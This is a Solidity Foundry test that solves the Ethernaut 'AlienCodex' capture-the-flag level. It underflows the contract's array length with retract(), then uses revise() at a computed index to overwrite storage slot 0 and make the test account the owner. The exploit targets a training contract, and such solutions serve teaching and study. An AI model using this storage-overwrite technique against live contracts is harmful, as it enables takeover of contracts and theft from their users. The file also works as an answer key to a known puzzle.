// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "forge-std/vm.sol";
import "../src/Ethernaut.sol";
import "../src/BaseLevel.sol";

contract AlienCodexTest is DSTest {
    Ethernaut ethernaut;
    address alienCodexFactory;
    address eoa = address(69);
    Vm private constant vm = Vm(HEVM_ADDRESS);

    function setUp() public {
        ethernaut = new Ethernaut();
        address alienCodexFactoryMem;

        bytes memory factoryBytecode = abi.encodePacked(
            vm.getCode("./src/levels/AlienCodex/AlienCodex.json")
        );

        assembly {
            alienCodexFactoryMem := create(
                0,
                add(factoryBytecode, 0x20),
                mload(factoryBytecode)
            )
        }

        alienCodexFactory = alienCodexFactoryMem;

        ethernaut.registerLevel(Level(alienCodexFactory));
    }

    function testIsAlienCodexCleared() public {
        vm.startPrank(eoa);

        address instance = ethernaut.createLevelInstance(
            Level(alienCodexFactory)
        );

        (bool makeContactSuccess, ) = instance.call(
            abi.encodeWithSignature("make_contact()")
        );
        require(makeContactSuccess, "make_contact() failed");

        (bool retractSuccess, ) = instance.call(
            abi.encodeWithSignature("retract()")
        );
        require(retractSuccess, "retract() failed");

        uint256 ownerIndex = type(uint256).max -
            uint256(keccak256(abi.encode(1))) +
            1;

        (bool reviseSuccess, ) = instance.call(
            abi.encodeWithSignature(
                "revise(uint256,bytes32)",
                ownerIndex,
                bytes32(abi.encode(eoa))
            )
        );
        require(reviseSuccess, "revise() failed");

        assertTrue(ethernaut.submitLevelInstance(payable(instance)));

        vm.stopPrank();
    }
}
